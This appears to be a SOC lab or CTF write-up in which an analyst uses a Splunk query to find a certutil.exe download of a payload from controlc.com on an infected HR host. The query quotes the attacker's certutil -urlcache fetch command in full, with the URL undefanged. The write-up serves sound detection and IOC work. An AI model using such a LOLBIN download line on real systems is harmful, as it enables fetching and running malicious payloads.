# Network Analysis – External Communication Investigation

## Objective
Identify the third-party site and external URL accessed by the infected HR host during malicious payload download activity.

## Query Used
```spl
index=win_eventlogs HostName="*HR*" CommandLine="certutil.exe -urlcache -f - https://controlc.com/e4d11035 benign.exe"

```

## Time Range / Filters Applied

Investigation scoped to March 2022, configured via the Splunk UI.

The query filters for:

HostName="*HR*" to isolate HR department hosts

A CommandLine showing outbound communication via a LOLBIN

A specific external URL used during payload retrieval

## Explanation

index=win_eventlogs specifies the Windows Event Logs index containing Event ID 4688 process creation events.

The use of certutil.exe indicates outbound network activity initiated through a native Windows utility.

The command line explicitly contains the full external URL contacted by the infected host.

By analyzing this field, the third-party site used for payload hosting and the exact resource accessed can be identified.

This method allows SOC analysts to extract network indicators even when only host-based logs are available.

## Result

Third-party site accessed: controlc.com

URL connected to by infected host:
hxxps://controlc[.]com/e4d11035


Observed technique: LOLBIN-based outbound communication for payload retrieval

## Why This Matters

Identifying external network connections is critical for containment and threat hunting. This analysis helps SOC analysts:

Extract Indicators of Compromise (IOCs) for blocking and detection

Identify abused third-party infrastructure

Correlate host-based activity with network behavior

This step provides actionable network indicators that can be used to enhance detection rules, firewall policies, and threat intelligence feeds.


